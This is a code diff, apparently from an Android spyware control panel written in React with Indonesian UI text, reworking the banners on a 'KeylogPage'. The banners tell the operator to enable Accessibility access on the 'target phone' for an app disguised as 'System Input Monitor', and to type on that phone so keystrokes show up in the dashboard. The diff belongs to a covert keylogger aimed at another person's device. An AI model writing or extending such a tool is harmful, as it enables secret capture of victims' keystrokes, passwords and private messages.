@@ -112,11 +112,19 @@ export default function KeylogPage() {
             </div>
           </div>
 
-          {/* Setup banner */}
-          <div className="mb-4 p-3 bg-android-red/10 border border-android-red/30 rounded-xl text-xs text-android-red">
-            ⚠️ Aktifkan <strong>Accessibility Access</strong> di HP target:<br />
-            Settings → Accessibility → Downloaded Apps → <strong>System Input Monitor</strong> → ON
-          </div>
+          {/* Setup banner — hanya tampil jika connected tapi belum ada data */}
+          {connected && entries.length === 0 && !loading && (
+            <div className="mb-4 p-3 bg-android-yellow/10 border border-android-yellow/30 rounded-xl text-xs text-android-yellow">
+              ⚠️ Pastikan <strong>System Input Monitor</strong> sudah diaktifkan:<br />
+              Settings → Accessibility → Downloaded Apps → <strong>System Input Monitor</strong> → ON<br />
+              <span className="text-android-muted mt-1 block">Jika sudah ON tapi kosong, coba ketik di app manapun di HP target.</span>
+            </div>
+          )}
+          {!connected && (
+            <div className="mb-4 p-3 bg-android-surface border border-android-border rounded-xl text-xs text-android-muted">
+              Hubungkan device untuk melihat data keylogger.
+            </div>
+          )}
 
           {/* Search */}
           <div className="relative mb-4">
